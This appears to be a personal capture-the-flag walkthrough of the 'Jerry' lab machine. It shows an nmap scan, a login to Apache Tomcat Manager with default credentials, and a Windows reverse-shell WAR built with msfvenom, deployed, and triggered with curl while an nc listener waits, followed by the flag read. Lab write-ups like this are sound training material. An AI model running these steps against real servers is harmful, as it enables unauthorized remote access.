# 👨 Jerry

# Nmap Scan

```
sudo nmap -p- 10.129.136.9
```

```
sudo nmap -p 8080 -sCV 10.129.136.9
```

\# nmap output:

![[Pasted image 20240229212219.png]]

The nmap scan shows just one port open:
- Port 8080 for HTTP

# Apache Tomcat

Putting `10.129.136.9:8080` into Firefox takes us to this website:

![[Pasted image 20240229212400.png]]

I clicked on Manager app and after doing the [[Tabby]] machine earlier I knew the default credentials for tomcat are: `tomcat:s3cret`

This combination worked and I now had access to the Tomcat Manager App:

![[Pasted image 20240302014118.png]]

## Creating Reverse Shell

A reverse shell can be created using a `.war` file. Scrolling down the Tomcat Manager page I can see that this instance of Tomcat is running on a Windows Server.

\# Generating the `.war` file

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f war > rev_shell_4444.war
```

\# Checking the `.jsp` of the `.war`

```
jar -ft rev_shell_4444.war
```

\# Uploading the `.war` file to Tomcat

![[Pasted image 20240302015346.png]]

\# Start Ncat listener

```
nc -lnvp 4444
```

\# Deploy the `.war` file

![[Pasted image 20240302015604.png]]

\# Use `curl` to execute

```
curl http://10.129.136.9:8080/rev_shell_4444/sevgbtdnymoed.jsp
```

![[Pasted image 20240302020313.png]]

I now have a reverse shell:

![[Pasted image 20240302020425.png]]

---

# 🤯 User Own & 🖥 System Own

I can `cd` around like in Linux but it is `dir` to list contents of directories.

The flag can be found in: `C:\Users\Administrator\Desktop\flags`

The file name is: 2 for the price of 1.txt

This means that in order to `type` it out to screen the filename must be surrounded by " ".

![[Pasted image 20240302020949.png]]
